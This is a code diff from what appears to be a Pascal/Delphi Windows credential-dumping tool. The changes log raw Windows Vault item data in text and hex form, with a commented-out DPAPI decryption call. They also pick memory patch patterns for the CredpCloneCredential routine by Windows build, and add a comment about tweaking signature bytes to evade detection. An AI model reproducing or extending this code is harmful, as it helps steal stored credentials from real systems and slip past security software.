@@ -261,6 +261,7 @@ var
   VIE:_VAULT_ITEM_ELEMENT;
   VIE_BYTE:_VAULT_ITEM_ELEMENT_BYTEARRAY ;
   bytes,output:tbytes;
+  tmp:string='';
 begin
     result:=false;
     //fillchar(vaults,sizeof(vaults),0);
@@ -320,10 +321,13 @@ begin
                                            //log('Data:'+inttohex(nativeuint(VIE_BYTE.Value ),8) );
                                            if VIE_BYTE.Length>0 then
                                                begin
+                                               tmp:='';
                                                setlength(bytes,VIE_BYTE.Length);
                                                copymemory(@bytes[0],VIE_BYTE.Value,VIE_BYTE.Length);
-                                               for k:=0 to VIE_BYTE.Length do write(bytes[k]);log('');
-                                               //dpapi is used for sure - entropy?
+                                               //for k:=0 to VIE_BYTE.Length do tmp:=tmp+inttohex(bytes[k],2);
+                                               log('data:'+BytetoAnsiString(bytes),1);
+                                               log('data:'+ByteToHexaString(bytes),1);
+                                               //dpapi is used - entropy?
                                                //CryptUnProtectData_(bytes,output);
                                                end;
                                            end;
@@ -364,7 +368,9 @@ const
 var
   pattern:array of byte;
 begin
-
+  //lame evasion detection...
+  //inc(PTRN_WN60_CredpCloneCredential[0]);
+  //
   if LowerCase (osarch )='amd64' then
      begin
      if copy(winver,1,3)='6.0' then
@@ -455,6 +461,7 @@ begin
      begin
      //nothing needed here
      if (pos('-1809',winver)>0) or (pos('-1903',winver)>0) or (pos('-1909',winver)>0) or (pos('-2004',winver)>0) then
+        //we could add some more windows versions here...
         begin
         setlength(after,sizeof(PATC_WN64_CredpCloneCredentialJmpShort));
         setlength(backup,sizeof(PATC_WN64_CredpCloneCredentialJmpShort));
